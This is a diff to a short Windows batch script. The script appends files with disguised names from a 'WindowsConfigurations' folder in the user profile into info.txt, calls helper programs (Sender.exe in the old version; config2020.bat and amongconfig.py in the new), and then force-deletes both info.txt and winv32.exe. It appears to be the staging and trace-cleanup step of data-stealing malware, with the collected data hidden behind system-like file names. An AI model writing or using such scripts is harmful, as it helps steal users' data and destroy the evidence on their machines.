@@ -1,7 +1,8 @@
 @echo off
-type %homedrive%\%homepath%\WindowsConfigurations\winv32.exe>> Info.txt
-type %homedrive%\%homepath%\WindowsConfigurations\config32.exe>>Info.txt
-Sender.exe
+config2020.bat
+type %homedrive%\%homepath%\WindowsConfigurations\winv32.exe>> info.txt
+amongconfig.py
 del /f info.txt
+del /f %homedrive%\%homepath%\WindowsConfigurations\winv32.exe
 exit
 
